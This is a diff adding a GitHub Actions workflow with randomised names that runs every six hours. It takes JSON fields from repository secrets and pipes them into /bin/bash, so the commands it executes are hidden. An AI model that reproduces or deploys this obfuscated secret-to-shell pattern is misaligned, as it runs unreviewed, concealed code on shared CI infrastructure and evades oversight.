@@ -1,0 +1,26 @@
+name: yuytyinanshou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuytyinanshou
+        env:
+          lbh70: ${{ secrets.lbh70 }}
+        run: |
+          echo $lbh70 | jq -r .jrkbp7839 | /bin/bash
+          echo $mkawu21297 | jq -r .zsnjy2 | /bin/bash
+          echo $g94666 | jq -r .iqr2 | /bin/bash
+          echo $ur63 | jq -r .szv523 | /bin/bash
+          echo $sl98 | jq -r .dxzd121 | /bin/bash
+          echo $zjm431 | jq -r .gmac8042 | /bin/bash
+          echo $csvcl427 | jq -r .inxv605 | /bin/bash
+          echo $l0 | jq -r .ih0840 | /bin/bash
+
